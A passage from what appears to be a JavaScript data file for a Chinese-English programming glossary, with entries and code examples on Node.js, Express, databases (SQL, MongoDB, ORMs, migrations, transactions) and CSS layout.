    res.status(401).json({ error: 'Invalid token' });
  }
};

// 使用中间件
app.use(loggerMiddleware);
app.use('/api/protected', authMiddleware);`,
      useCases: ['身份验证', '日志记录', '错误处理', '数据验证'],
      relatedTerms: ['express', 'routing', 'authentication']
    },
    {
      id: 'node_2',
      name: 'event_emitter',
      chinese: '事件发射器',
      description: 'Node.js中用于处理事件的核心模块，实现观察者模式',
      difficulty: 'intermediate',
      tags: ['events', 'async', 'patterns'],
      example: `const EventEmitter = require('events');

// 创建自定义事件发射器
class MyEmitter extends EventEmitter {}
const myEmitter = new MyEmitter();

// 监听事件
myEmitter.on('data', (data) => {
  console.log('Received data:', data);
});

myEmitter.on('error', (error) => {
  console.error('Error occurred:', error);
});

// 一次性监听器
myEmitter.once('start', () => {
  console.log('Started only once');
});

// 发射事件
myEmitter.emit('data', { message: 'Hello World' });
myEmitter.emit('start');
myEmitter.emit('start'); // 不会触发，因为是once

// 实际应用示例
class DatabaseConnection extends EventEmitter {
  connect() {
    setTimeout(() => {
      this.emit('connected', { host: 'localhost', port: 5432 });
    }, 1000);
  }

  query(sql) {
    if (Math.random() > 0.8) {
      this.emit('error', new Error('Query failed'));
    } else {
      this.emit('result', { rows: [], count: 0 });
    }
  }
}`,
      useCases: ['异步通信', '解耦组件', '状态通知', '流处理'],
      relatedTerms: ['observer pattern', 'async', 'streams', 'callbacks']
    },
    {
      id: 'node_3',
      name: 'streams',
      chinese: '流',
      description: '用于处理大量数据的抽象接口，支持读取、写入、转换数据',
      difficulty: 'advanced',
      tags: ['data', 'performance', 'memory'],
      example: `const fs = require('fs');
const { Transform } = require('stream');

// 读取流
const readStream = fs.createReadStream('large-file.txt', {
  encoding: 'utf8',
  highWaterMark: 1024 // 缓冲区大小
});

// 写入流
const writeStream = fs.createWriteStream('output.txt');

// 转换流 - 将文本转为大写
const upperCaseTransform = new Transform({
  transform(chunk, encoding, callback) {
    this.push(chunk.toString().toUpperCase());
    callback();
  }
});

// 管道操作
readStream
  .pipe(upperCaseTransform)
  .pipe(writeStream);

// 处理事件
readStream.on('data', (chunk) => {
  console.log(\`Received \${chunk.length} bytes\`);
});

readStream.on('end', () => {
  console.log('File reading completed');
});

readStream.on('error', (error) => {
  console.error('Read error:', error);
});

// HTTP请求流处理
const http = require('http');

const server = http.createServer((req, res) => {
  if (req.method === 'POST') {
    let body = '';

    req.on('data', (chunk) => {
      body += chunk.toString();
    });

    req.on('end', () => {
      console.log('Request body:', body);
      res.end('Data received');
    });
  }
});`,
      useCases: ['文件处理', '网络传输', '数据转换', '内存优化'],
      relatedTerms: ['buffer', 'pipe', 'events', 'memory management']
    },
    {
      id: 'node_4',
      name: 'buffer',
      chinese: '缓冲区',
      description: '用于处理二进制数据的全局对象，在文件和网络操作中广泛使用',
      difficulty: 'intermediate',
      tags: ['binary', 'data', 'memory'],
      example: `// 创建Buffer
const buf1 = Buffer.alloc(10); // 分配10字节的零填充缓冲区
const buf2 = Buffer.from('Hello World', 'utf8'); // 从字符串创建
const buf3 = Buffer.from([0x48, 0x65, 0x6c, 0x6c, 0x6f]); // 从数组创建

// Buffer操作
console.log(buf2.toString()); // "Hello World"
console.log(buf2.toString('hex')); // "48656c6c6f20576f726c64"
console.log(buf2.toString('base64')); // "SGVsbG8gV29ybGQ="

// 写入和读取
const buffer = Buffer.alloc(20);
buffer.write('Node.js', 0, 'utf8');
console.log(buffer.toString('utf8', 0, 7)); // "Node.js"

// 拷贝和切片
const source = Buffer.from('Hello World');
const target = Buffer.alloc(5);
source.copy(target, 0, 0, 5);
console.log(target.toString()); // "Hello"

const slice = source.slice(6, 11);
console.log(slice.toString()); // "World"

// 文件操作中的Buffer
const fs = require('fs');

fs.readFile('image.jpg', (err, data) => {
  if (err) throw err;
  console.log(\`File size: \${data.length} bytes\`);

  // 写入文件
  fs.writeFile('copy.jpg', data, (err) => {
    if (err) throw err;
    console.log('File copied successfully');
  });
});`,
      useCases: ['文件操作', '网络传输', '加密解密', '图像处理'],
      relatedTerms: ['streams', 'encoding', 'binary data', 'file system']
    },
    {
      id: 'node_5',
      name: 'express_routing',
      chinese: 'Express路由',
      description: 'Express框架中定义应用程序端点的机制，处理不同HTTP请求',
      difficulty: 'beginner',
      tags: ['express', 'routing', 'http'],
      example: `const express = require('express');
const app = express();

// 基本路由
app.get('/', (req, res) => {
  res.send('Hello World!');
});

app.post('/users', (req, res) => {
  res.json({ message: 'User created' });
});

// 路由参数
app.get('/users/:id', (req, res) => {
  const userId = req.params.id;
  res.json({ userId, message: \`User \${userId} details\` });
});

// 查询参数
app.get('/search', (req, res) => {
  const { q, limit = 10 } = req.query;
  res.json({ query: q, limit: parseInt(limit) });
});

// 路由模式匹配
app.get('/files/*', (req, res) => {
  const filePath = req.params[0];
  res.send(\`File path: \${filePath}\`);
});

// 多个处理函数
app.get('/protected',
  (req, res, next) => {
    // 中间件：验证token
    const token = req.headers.authorization;
    if (!token) {
      return res.status(401).json({ error: 'No token' });
    }
    next();
  },
  (req, res) => {
    res.json({ message: 'Protected resource' });
  }
);

// 路由器
const userRouter = express.Router();

userRouter.get('/', (req, res) => {
  res.json({ users: [] });
});

userRouter.post('/', (req, res) => {
  res.json({ message: 'User created' });
});

userRouter.put('/:id', (req, res) => {
  res.json({ message: \`User \${req.params.id} updated\` });
});

// 挂载路由器
app.use('/api/users', userRouter);

// 错误处理
app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(500).json({ error: 'Something went wrong!' });
});`,
      useCases: ['API设计', 'RESTful服务', '路径匹配', '请求处理'],
      relatedTerms: ['middleware', 'http methods', 'parameters', 'express']
    },
    {
      id: 'node_6',
      name: 'npm_packages',
      chinese: 'NPM包管理',
      description: 'Node.js的包管理器，用于安装、管理和发布JavaScript包',
      difficulty: 'beginner',
      tags: ['npm', 'packages', 'dependencies'],
      example: `// package.json 配置
{
  "name": "my-project",
  "version": "1.0.0",
  "description": "A sample Node.js project",
  "main": "index.js",
  "scripts": {
    "start": "node index.js",
    "dev": "nodemon index.js",
    "test": "jest",
    "build": "webpack --mode production",
    "lint": "eslint src/",
    "format": "prettier --write src/"
  },
  "dependencies": {
    "express": "^4.18.0",
    "mongoose": "^6.0.0",
    "jsonwebtoken": "^8.5.1"
  },
  "devDependencies": {
    "nodemon": "^2.0.0",
    "jest": "^28.0.0",
    "eslint": "^8.0.0",
    "prettier": "^2.0.0"
  },
  "engines": {
    "node": ">=14.0.0",
    "npm": ">=6.0.0"
  }
}

// 常用NPM命令
/*
# 初始化项目
npm init
npm init -y

# 安装依赖
npm install express
npm install --save express
npm install --save-dev nodemon
npm install -g typescript

# 更新依赖
npm update
npm update express
npm outdated

# 卸载依赖
npm uninstall express
npm uninstall --save-dev nodemon

# 运行脚本
npm start
npm run dev
npm test

# 发布包
npm login
npm publish
npm version patch
*/

// 使用已安装的包
const express = require('express');
const jwt = require('jsonwebtoken');
const mongoose = require('mongoose');

// 检查包版本
console.log('Express version:', require('express/package.json').version);

// 环境变量配置
const PORT = process.env.PORT || 3000;
const NODE_ENV = process.env.NODE_ENV || 'development';

// 条件加载开发依赖
if (NODE_ENV === 'development') {
  const nodemon = require('nodemon');
}`,
      useCases: ['依赖管理', '项目配置', '脚本自动化', '包发布'],
      relatedTerms: ['package.json', 'node_modules', 'semantic versioning', 'scripts']
    },
    {
      id: 'node_7',
      name: 'async_patterns',
      chinese: '异步编程模式',
      description: 'Node.js中处理异步操作的各种模式和最佳实践',
      difficulty: 'intermediate',
      tags: ['async', 'patterns', 'callbacks', 'promises'],
      example: `// 1. 回调模式 (Callback Pattern)
const fs = require('fs');

function readFileCallback(filename, callback) {
  fs.readFile(filename, 'utf8', (err, data) => {
    if (err) {
      return callback(err, null);
    }
    callback(null, data);
  });
}

// 使用回调
readFileCallback('file.txt', (err, data) => {
  if (err) {
    console.error('Error:', err);
  } else {
    console.log('File content:', data);
  }
});

// 2. Promise模式
const { promisify } = require('util');
const readFilePromise = promisify(fs.readFile);

function readFileWithPromise(filename) {
  return readFilePromise(filename, 'utf8');
}

// 使用Promise
readFileWithPromise('file.txt')
  .then(data => console.log('File content:', data))
  .catch(err => console.error('Error:', err));

// 3. Async/Await模式
async function readFileAsync(filename) {
  try {
    const data = await readFilePromise(filename, 'utf8');
    return data;
  } catch (error) {
    throw new Error(\`Failed to read file: \${error.message}\`);
  }
}

// 使用async/await
async function processFile() {
  try {
    const content = await readFileAsync('file.txt');
    console.log('File content:', content);
  } catch (error) {
    console.error('Error:', error.message);
  }
}

// 4. 并行处理
async function readMultipleFiles() {
  try {
    const [file1, file2, file3] = await Promise.all([
      readFileAsync('file1.txt'),
      readFileAsync('file2.txt'),
      readFileAsync('file3.txt')
    ]);

    return { file1, file2, file3 };
  } catch (error) {
    console.error('Error reading files:', error);
  }
}

// 5. 错误处理模式
process.on('uncaughtException', (error) => {
  console.error('Uncaught Exception:', error);
  process.exit(1);
});

process.on('unhandledRejection', (reason, promise) => {
  console.error('Unhandled Rejection at:', promise, 'reason:', reason);
});

// 6. 流式处理
const { pipeline } = require('stream');
const { createReadStream, createWriteStream } = require('fs');
const { createGzip } = require('zlib');

pipeline(
  createReadStream('input.txt'),
  createGzip(),
  createWriteStream('output.txt.gz'),
  (error) => {
    if (error) {
      console.error('Pipeline failed:', error);
    } else {
      console.log('Pipeline succeeded');
    }
  }
);`,
      useCases: ['文件操作', '网络请求', '数据库查询', '错误处理'],
      relatedTerms: ['callbacks', 'promises', 'async/await', 'error handling']
    },
    {
      id: 'node_8',
      name: 'environment_variables',
      chinese: '环境变量',
      description: '用于配置应用程序的外部变量，实现配置与代码分离',
      difficulty: 'beginner',
      tags: ['configuration', 'environment', 'security'],
      example: `// 1. 读取环境变量
const PORT = process.env.PORT || 3000;
const NODE_ENV = process.env.NODE_ENV || 'development';
const DATABASE_URL = process.env.DATABASE_URL;
const JWT_SECRET = process.env.JWT_SECRET;

console.log('Server running on port:', PORT);
console.log('Environment:', NODE_ENV);

// 2. 使用dotenv包
// npm install dotenv
require('dotenv').config();

// .env 文件内容
/*
PORT=3000
NODE_ENV=development
DATABASE_URL=mongodb://localhost:27017/myapp
JWT_SECRET=your-secret-key
API_KEY=your-api-key
REDIS_URL=redis://localhost:6379
EMAIL_HOST=smtp.gmail.com
EMAIL_PORT=587
EMAIL_USER=your-email@gmail.com
EMAIL_PASS=your-password
*/

// 3. 配置管理
const config = {
  development: {
    port: process.env.PORT || 3000,
    database: {
      url: process.env.DATABASE_URL || 'mongodb://localhost:27017/myapp-dev',
      options: {
        useNewUrlParser: true,
        useUnifiedTopology: true
      }
    },
    jwt: {
      secret: process.env.JWT_SECRET || 'dev-secret',
      expiresIn: '1h'
    },
    logging: {
      level: 'debug'
    }
  },
  production: {
    port: process.env.PORT || 80,
    database: {
      url: process.env.DATABASE_URL,
      options: {
        useNewUrlParser: true,
        useUnifiedTopology: true,
        ssl: true
      }
    },
    jwt: {
      secret: process.env.JWT_SECRET,
      expiresIn: '15m'
    },
    logging: {
      level: 'error'
    }
  }
};

const currentConfig = config[NODE_ENV] || config.development;

// 4. 验证必需的环境变量
function validateEnvironment() {
  const required = ['DATABASE_URL', 'JWT_SECRET'];
  const missing = required.filter(key => !process.env[key]);

  if (missing.length > 0) {
    console.error('Missing required environment variables:', missing);
    process.exit(1);
  }
}

if (NODE_ENV === 'production') {
  validateEnvironment();
}

// 5. 类型转换和默认值
const config = {
  port: parseInt(process.env.PORT) || 3000,
  enableLogging: process.env.ENABLE_LOGGING === 'true',
  maxConnections: parseInt(process.env.MAX_CONNECTIONS) || 100,
  timeout: parseFloat(process.env.TIMEOUT) || 30.0,
  allowedOrigins: process.env.ALLOWED_ORIGINS?.split(',') || ['http://localhost:3000']
};

module.exports = currentConfig;`,
      useCases: ['应用配置', '敏感信息保护', '环境区分', '部署配置'],
      relatedTerms: ['dotenv', 'configuration', 'security', 'deployment']
    }
  ],

  // 数据库相关 (80个术语)
  database: [
    {
      id: 'db_1',
      name: 'nosql',
      chinese: '非关系型数据库',
      description: '不使用传统表格关系模型的数据库，提供更灵活的数据存储方式',
      difficulty: 'intermediate',
      tags: ['database', 'scalability', 'flexibility'],
      example: `// MongoDB 文档示例
{
  "_id": ObjectId("507f1f77bcf86cd799439011"),
  "name": "Alice Johnson",
  "email": "alice@example.com",
  "profile": {
    "age": 28,
    "location": "San Francisco",
    "skills": ["JavaScript", "Python", "React"],
    "experience": [
      {
        "company": "TechCorp",
        "position": "Frontend Developer",
        "duration": "2020-2023"
      }
    ]
  },
  "preferences": {
    "theme": "dark",
    "notifications": true
  },
  "createdAt": ISODate("2023-01-15T08:00:00Z")
}`,
      useCases: ['大数据处理', '实时应用', '内容管理', '物联网'],
      relatedTerms: ['mongodb', 'document store', 'key-value']
    },
    {
      id: 'db_2',
      name: 'sql',
      chinese: '结构化查询语言',
      description: '用于管理关系型数据库的标准语言，支持数据查询、插入、更新和删除',
      difficulty: 'beginner',
      tags: ['database', 'query', 'relational'],
      example: `-- 创建表
CREATE TABLE users (
  id SERIAL PRIMARY KEY,
  name VARCHAR(100) NOT NULL,
  email VARCHAR(255) UNIQUE NOT NULL,
  age INTEGER CHECK (age >= 0),
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- 插入数据
INSERT INTO users (name, email, age)
VALUES
  ('Alice Johnson', 'alice@example.com', 28),
  ('Bob Smith', 'bob@example.com', 32),
  ('Carol Davis', 'carol@example.com', 25);

-- 查询数据
SELECT name, email, age
FROM users
WHERE age > 25
ORDER BY age DESC
LIMIT 10;

-- 更新数据
UPDATE users
SET age = 29
WHERE email = 'alice@example.com';

-- 删除数据
DELETE FROM users
WHERE age < 18;

-- 连接查询
SELECT u.name, p.title, p.content
FROM users u
INNER JOIN posts p ON u.id = p.user_id
WHERE u.age > 25;

-- 聚合查询
SELECT
  COUNT(*) as total_users,
  AVG(age) as average_age,
  MIN(age) as youngest,
  MAX(age) as oldest
FROM users;`,
      useCases: ['数据查询', '数据分析', '报表生成', '数据管理'],
      relatedTerms: ['database', 'relational', 'joins', 'indexes']
    },
    {
      id: 'db_3',
      name: 'orm',
      chinese: '对象关系映射',
      description: '将数据库表映射为编程语言对象的技术，简化数据库操作',
      difficulty: 'intermediate',
      tags: ['database', 'abstraction', 'mapping'],
      example: `// Sequelize ORM 示例 (Node.js)
const { Sequelize, DataTypes } = require('sequelize');

// 连接数据库
const sequelize = new Sequelize('database', 'username', 'password', {
  host: 'localhost',
  dialect: 'postgres'
});

// 定义模型
const User = sequelize.define('User', {
  name: {
    type: DataTypes.STRING,
    allowNull: false
  },
  email: {
    type: DataTypes.STRING,
    allowNull: false,
    unique: true,
    validate: {
      isEmail: true
    }
  },
  age: {
    type: DataTypes.INTEGER,
    validate: {
      min: 0,
      max: 120
    }
  }
});

const Post = sequelize.define('Post', {
  title: DataTypes.STRING,
  content: DataTypes.TEXT
});

// 定义关联
User.hasMany(Post);
Post.belongsTo(User);

// 使用模型
async function createUser() {
  const user = await User.create({
    name: 'Alice Johnson',
    email: 'alice@example.com',
    age: 28
  });

  const post = await Post.create({
    title: 'My First Post',
    content: 'Hello World!',
    UserId: user.id
  });

  return user;
}

// 查询数据
async function getUsers() {
  const users = await User.findAll({
    where: {
      age: {
        [Sequelize.Op.gt]: 25
      }
    },
    include: [Post],
    order: [['age', 'DESC']]
  });

  return users;
}`,
      useCases: ['简化数据库操作', '类型安全', '关系管理', '数据验证'],
      relatedTerms: ['models', 'migrations', 'associations', 'validation']
    },
    {
      id: 'db_4',
      name: 'acid',
      chinese: 'ACID特性',
      description: '数据库事务必须满足的四个特性：原子性、一致性、隔离性、持久性',
      difficulty: 'advanced',
      tags: ['database', 'transactions', 'reliability'],
      example: `-- 原子性 (Atomicity) 示例
BEGIN TRANSACTION;

UPDATE accounts SET balance = balance - 100 WHERE id = 1;
UPDATE accounts SET balance = balance + 100 WHERE id = 2;

-- 如果任何一个操作失败，整个事务回滚
COMMIT; -- 或 ROLLBACK;

-- 一致性 (Consistency) 示例
-- 约束确保数据一致性
ALTER TABLE accounts
ADD CONSTRAINT check_balance
CHECK (balance >= 0);

-- 隔离性 (Isolation) 示例
-- 不同隔离级别
SET TRANSACTION ISOLATION LEVEL READ COMMITTED;
-- READ UNCOMMITTED, READ COMMITTED, REPEATABLE READ, SERIALIZABLE

-- 持久性 (Durability) 示例
-- 事务提交后，数据永久保存
BEGIN TRANSACTION;
INSERT INTO orders (user_id, product_id, quantity)
VALUES (1, 100, 2);
COMMIT; -- 数据持久化到磁盘

-- Node.js 中的事务处理
const { Pool } = require('pg');
const pool = new Pool();

async function transferMoney(fromId, toId, amount) {
  const client = await pool.connect();

  try {
    await client.query('BEGIN');

    // 检查余额
    const fromAccount = await client.query(
      'SELECT balance FROM accounts WHERE id = $1',
      [fromId]
    );

    if (fromAccount.rows[0].balance < amount) {
      throw new Error('Insufficient funds');
    }

    // 执行转账
    await client.query(
      'UPDATE accounts SET balance = balance - $1 WHERE id = $2',
      [amount, fromId]
    );

    await client.query(
      'UPDATE accounts SET balance = balance + $1 WHERE id = $2',
      [amount, toId]
    );

    await client.query('COMMIT');
    console.log('Transfer completed successfully');

  } catch (error) {
    await client.query('ROLLBACK');
    console.error('Transfer failed:', error.message);
    throw error;
  } finally {
    client.release();
  }
}`,
      useCases: ['金融系统', '电商平台', '库存管理', '数据完整性'],
      relatedTerms: ['transactions', 'consistency', 'isolation levels', 'rollback']
    },
    {
      id: 'db_5',
      name: 'indexing',
      chinese: '数据库索引',
      description: '提高数据库查询性能的数据结构，通过创建指向数据的指针来加速查找',
      difficulty: 'intermediate',
      tags: ['performance', 'optimization', 'indexing'],
      example: `-- 创建索引
CREATE INDEX idx_user_email ON users(email);
CREATE INDEX idx_user_name ON users(name);
CREATE INDEX idx_post_created_at ON posts(created_at);

-- 复合索引
CREATE INDEX idx_user_age_city ON users(age, city);
CREATE INDEX idx_post_user_date ON posts(user_id, created_at);

-- 唯一索引
CREATE UNIQUE INDEX idx_user_username ON users(username);

-- 部分索引
CREATE INDEX idx_active_users ON users(email) WHERE active = true;

-- 函数索引
CREATE INDEX idx_user_lower_email ON users(LOWER(email));

-- 查看索引使用情况
EXPLAIN ANALYZE SELECT * FROM users WHERE email = 'alice@example.com';

-- MongoDB索引示例
// 创建单字段索引
db.users.createIndex({ email: 1 });

// 创建复合索引
db.posts.createIndex({ userId: 1, createdAt: -1 });

// 创建文本索引
db.articles.createIndex({ title: "text", content: "text" });

// 创建地理空间索引
db.locations.createIndex({ coordinates: "2dsphere" });

// 查看索引
db.users.getIndexes();

// 查询性能分析
db.users.find({ email: "alice@example.com" }).explain("executionStats");

// Node.js中使用索引
const mongoose = require('mongoose');

const userSchema = new mongoose.Schema({
  email: {
    type: String,
    required: true,
    unique: true,
    index: true
  },
  name: {
    type: String,
    index: true
  },
  age: Number,
  city: String,
  createdAt: {
    type: Date,
    default: Date.now,
    index: true
  }
});

// 复合索引
userSchema.index({ age: 1, city: 1 });

// 文本索引
userSchema.index({ name: 'text', bio: 'text' });

const User = mongoose.model('User', userSchema);`,
      useCases: ['查询优化', '性能提升', '数据检索', '排序加速'],
      relatedTerms: ['performance', 'query optimization', 'btree', 'hash index']
    },
    {
      id: 'db_6',
      name: 'mongodb_aggregation',
      chinese: 'MongoDB聚合',
      description: 'MongoDB的数据处理管道，用于复杂的数据分析和转换操作',
      difficulty: 'advanced',
      tags: ['mongodb', 'aggregation', 'data-processing'],
      example: `// 基本聚合管道
db.orders.aggregate([
  // 阶段1: 匹配条件
  { $match: { status: "completed", date: { $gte: new Date("2023-01-01") } } },

  // 阶段2: 分组和计算
  { $group: {
    _id: "$customerId",
    totalAmount: { $sum: "$amount" },
    orderCount: { $sum: 1 },
    avgAmount: { $avg: "$amount" },
    maxAmount: { $max: "$amount" }
  }},

  // 阶段3: 排序
  { $sort: { totalAmount: -1 } },

  // 阶段4: 限制结果
  { $limit: 10 }
]);

// 复杂聚合示例
db.products.aggregate([
  // 展开数组字段
  { $unwind: "$categories" },

  // 查找关联数据
  { $lookup: {
    from: "categories",
    localField: "categories",
    foreignField: "_id",
    as: "categoryInfo"
  }},

  // 展开查找结果
  { $unwind: "$categoryInfo" },

  // 分组统计
  { $group: {
    _id: "$categoryInfo.name",
    productCount: { $sum: 1 },
    avgPrice: { $avg: "$price" },
    products: { $push: {
      name: "$name",
      price: "$price"
    }}
  }},

  // 添加计算字段
  { $addFields: {
    priceRange: {
      $switch: {
        branches: [
          { case: { $lt: ["$avgPrice", 50] }, then: "Budget" },
          { case: { $lt: ["$avgPrice", 200] }, then: "Mid-range" },
          { case: { $gte: ["$avgPrice", 200] }, then: "Premium" }
        ],
        default: "Unknown"
      }
    }
  }},

  // 投影输出字段
  { $project: {
    categoryName: "$_id",
    productCount: 1,
    avgPrice: { $round: ["$avgPrice", 2] },
    priceRange: 1,
    topProducts: { $slice: ["$products", 3] }
  }}
]);

// 时间序列聚合
db.sales.aggregate([
  { $match: {
    date: {
      $gte: new Date("2023-01-01"),
      $lt: new Date("2024-01-01")
    }
  }},

  // 按月分组
  { $group: {
    _id: {
      year: { $year: "$date" },
      month: { $month: "$date" }
    },
    totalSales: { $sum: "$amount" },
    orderCount: { $sum: 1 },
    uniqueCustomers: { $addToSet: "$customerId" }
  }},

  // 计算唯一客户数
  { $addFields: {
    uniqueCustomerCount: { $size: "$uniqueCustomers" }
  }},

  // 排序
  { $sort: { "_id.year": 1, "_id.month": 1 } }
]);

// Node.js中使用聚合
const mongoose = require('mongoose');

async function getTopCustomers() {
  const result = await Order.aggregate([
    { $match: { status: 'completed' } },
    { $group: {
      _id: '$customerId',
      totalSpent: { $sum: '$amount' },
      orderCount: { $sum: 1 }
    }},
    { $lookup: {
      from: 'users',
      localField: '_id',
      foreignField: '_id',
      as: 'customer'
    }},
    { $unwind: '$customer' },
    { $project: {
      customerName: '$customer.name',
      customerEmail: '$customer.email',
      totalSpent: 1,
      orderCount: 1
    }},
    { $sort: { totalSpent: -1 } },
    { $limit: 10 }
  ]);

  return result;
}`,
      useCases: ['数据分析', '报表生成', '统计计算', '数据转换'],
      relatedTerms: ['pipeline', 'group', 'lookup', 'match']
    },
    {
      id: 'db_7',
      name: 'database_migrations',
      chinese: '数据库迁移',
      description: '管理数据库结构变更的版本控制系统，确保数据库schema的一致性',
      difficulty: 'intermediate',
      tags: ['migrations', 'schema', 'version-control'],
      example: `// Sequelize迁移示例
// migrations/20231201000001-create-users.js
module.exports = {
  up: async (queryInterface, Sequelize) => {
    await queryInterface.createTable('Users', {
      id: {
        allowNull: false,
        autoIncrement: true,
        primaryKey: true,
        type: Sequelize.INTEGER
      },
      email: {
        type: Sequelize.STRING,
        allowNull: false,
        unique: true
      },
      name: {
        type: Sequelize.STRING,
        allowNull: false
      },
      createdAt: {
        allowNull: false,
        type: Sequelize.DATE
      },
      updatedAt: {
        allowNull: false,
        type: Sequelize.DATE
      }
    });

    // 添加索引
    await queryInterface.addIndex('Users', ['email']);
  },

  down: async (queryInterface, Sequelize) => {
    await queryInterface.dropTable('Users');
  }
};

// migrations/20231202000001-add-user-profile.js
module.exports = {
  up: async (queryInterface, Sequelize) => {
    await queryInterface.addColumn('Users', 'bio', {
      type: Sequelize.TEXT,
      allowNull: true
    });

    await queryInterface.addColumn('Users', 'avatar', {
      type: Sequelize.STRING,
      allowNull: true
    });

    await queryInterface.addColumn('Users', 'isActive', {
      type: Sequelize.BOOLEAN,
      defaultValue: true
    });
  },

  down: async (queryInterface, Sequelize) => {
    await queryInterface.removeColumn('Users', 'bio');
    await queryInterface.removeColumn('Users', 'avatar');
    await queryInterface.removeColumn('Users', 'isActive');
  }
};

// Knex.js迁移示例
// migrations/20231201000001_create_users_table.js
exports.up = function(knex) {
  return knex.schema.createTable('users', function(table) {
    table.increments('id').primary();
    table.string('email').notNullable().unique();
    table.string('name').notNullable();
    table.text('bio');
    table.boolean('is_active').defaultTo(true);
    table.timestamps(true, true);

    // 添加索引
    table.index(['email']);
    table.index(['is_active']);
  });
};

exports.down = function(knex) {
  return knex.schema.dropTable('users');
};

// 运行迁移的命令
/*
# Sequelize
npx sequelize-cli db:migrate
npx sequelize-cli db:migrate:undo
npx sequelize-cli db:migrate:undo:all

# Knex
npx knex migrate:latest
npx knex migrate:rollback
npx knex migrate:rollback --all

# Prisma
npx prisma migrate dev
npx prisma migrate deploy
npx prisma migrate reset
*/

// Prisma迁移示例
// schema.prisma
/*
model User {
  id        Int      @id @default(autoincrement())
  email     String   @unique
  name      String
  bio       String?
  isActive  Boolean  @default(true)
  createdAt DateTime @default(now())
  updatedAt DateTime @updatedAt
  posts     Post[]

  @@index([email])
  @@index([isActive])
}

model Post {
  id        Int      @id @default(autoincrement())
  title     String
  content   String?
  published Boolean  @default(false)
  authorId  Int
  author    User     @relation(fields: [authorId], references: [id])
  createdAt DateTime @default(now())
  updatedAt DateTime @updatedAt

  @@index([authorId])
  @@index([published])
}
*/

// 种子数据 (seeders)
// seeders/20231201000001-demo-users.js
module.exports = {
  up: async (queryInterface, Sequelize) => {
    await queryInterface.bulkInsert('Users', [
      {
        email: 'alice@example.com',
        name: 'Alice Johnson',
        bio: 'Software developer',
        isActive: true,
        createdAt: new Date(),
        updatedAt: new Date()
      },
      {
        email: 'bob@example.com',
        name: 'Bob Smith',
        bio: 'Product manager',
        isActive: true,
        createdAt: new Date(),
        updatedAt: new Date()
      }
    ]);
  },

  down: async (queryInterface, Sequelize) => {
    await queryInterface.bulkDelete('Users', null, {});
  }
};`,
      useCases: ['版本控制', '团队协作', '部署管理', '数据库同步'],
      relatedTerms: ['schema', 'version control', 'rollback', 'seeders']
    },
    {
      id: 'db_8',
      name: 'transaction',
      chinese: '事务',
      description: '数据库中一组操作的逻辑单元，具有ACID特性（原子性、一致性、隔离性、持久性）',
      difficulty: 'intermediate',
      tags: ['database', 'acid', 'consistency'],
      example: `-- SQL事务示例
BEGIN TRANSACTION;

-- 转账操作：从账户A转100元到账户B
UPDATE accounts
SET balance = balance - 100
WHERE account_id = 'A';

UPDATE accounts
SET balance = balance + 100
WHERE account_id = 'B';

-- 检查余额是否足够
IF (SELECT balance FROM accounts WHERE account_id = 'A') >= 0
    COMMIT;  -- 提交事务
ELSE
    ROLLBACK;  -- 回滚事务

-- Node.js中的数据库事务
const mysql = require('mysql2/promise');

async function transferMoney(fromAccount, toAccount, amount) {
    const connection = await mysql.createConnection({
        host: 'localhost',
        user: 'root',
        password: 'password',
        database: 'bank'
    });

    try {
        // 开始事务
        await connection.beginTransaction();

        // 检查余额
        const [rows] = await connection.execute(
            'SELECT balance FROM accounts WHERE id = ?',
            [fromAccount]
        );

        if (rows[0].balance < amount) {
            throw new Error('余额不足');
        }

        // 扣款
        await connection.execute(
            'UPDATE accounts SET balance = balance - ? WHERE id = ?',
            [amount, fromAccount]
        );

        // 入账
        await connection.execute(
            'UPDATE accounts SET balance = balance + ? WHERE id = ?',
            [amount, toAccount]
        );

        // 提交事务
        await connection.commit();
        console.log('转账成功');

    } catch (error) {
        // 回滚事务
        await connection.rollback();
        console.error('转账失败:', error.message);
        throw error;

    } finally {
        await connection.end();
    }
}`,
      useCases: ['数据一致性', '并发控制', '错误恢复', '业务完整性'],
      relatedTerms: ['acid', 'commit', 'rollback', 'isolation levels']
    }
  ],

  // CSS与前端样式 (50个术语)
  css: [
    {
      id: 'css_1',
      name: 'css_grid',
      chinese: 'CSS网格布局',
      description: '二维布局系统，用于创建复杂的网页布局',
      difficulty: 'intermediate',
      tags: ['layout', 'responsive', 'design'],
      example: `.container {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
  grid-template-rows: auto 1fr auto;
  grid-template-areas:
    "header header header"
    "sidebar main main"
    "footer footer footer";
  gap: 20px;
  min-height: 100vh;
}

.header { grid-area: header; }
.sidebar { grid-area: sidebar; }
.main { grid-area: main; }
.footer { grid-area: footer; }

/* 响应式调整 */
@media (max-width: 768px) {
  .container {
    grid-template-areas:
      "header"
      "main"
      "sidebar"
      "footer";
    grid-template-columns: 1fr;
  }
}`,
      useCases: ['页面布局', '响应式设计', '组件排列', '复杂界面'],
      relatedTerms: ['flexbox', 'responsive design', 'media queries']
    },
    {
      id: 'css_2',
      name: 'flexbox',
      chinese: 'Flexbox弹性布局',
      description: '一维布局方法，用于在容器中分配空间和对齐项目',
      difficulty: 'beginner',
      tags: ['layout', 'alignment', 'responsive'],
      example: `/* 基本Flexbox容器 */
.flex-container {
  display: flex;
  justify-content: space-between; /* 主轴对齐 */
  align-items: center; /* 交叉轴对齐 */
  flex-wrap: wrap; /* 允许换行 */
  gap: 1rem; /* 项目间距 */
}

/* Flex项目属性 */
.flex-item {
  flex: 1; /* flex-grow: 1, flex-shrink: 1, flex-basis: 0% */
}

.flex-item-special {
  flex: 2 1 200px; /* grow: 2, shrink: 1, basis: 200px */
  align-self: flex-start; /* 单独对齐 */
}

/* 常用布局模式 */
.navbar {
  display: flex;
  justify-content: space-between;
  align-items: center;
}

.card-grid {
  display: flex;
  flex-wrap: wrap;
  gap: 1rem;
}

.card {
  flex: 1 1 300px; /* 最小宽度300px，可伸缩 */
}

/* 垂直居中 */
.center-content {
  display: flex;
  justify-content: center;
  align-items: center;
  min-height: 100vh;
}`,
      useCases: ['导航栏', '卡片布局', '居中对齐', '响应式组件'],
      relatedTerms: ['css grid', 'alignment', 'responsive', 'layout']
    },
    {
      id: 'css_3',
      name: 'css_variables',
      chinese: 'CSS自定义属性',
      description: '可重用的CSS值，支持动态更新和主题切换',
      difficulty: 'intermediate',
      tags: ['variables', 'theming', 'maintainability'],
      example: `:root {
  /* 颜色系统 */
  --primary-color: #3b82f6;
  --secondary-color: #8b5cf6;
  --success-color: #10b981;
  --error-color: #ef4444;
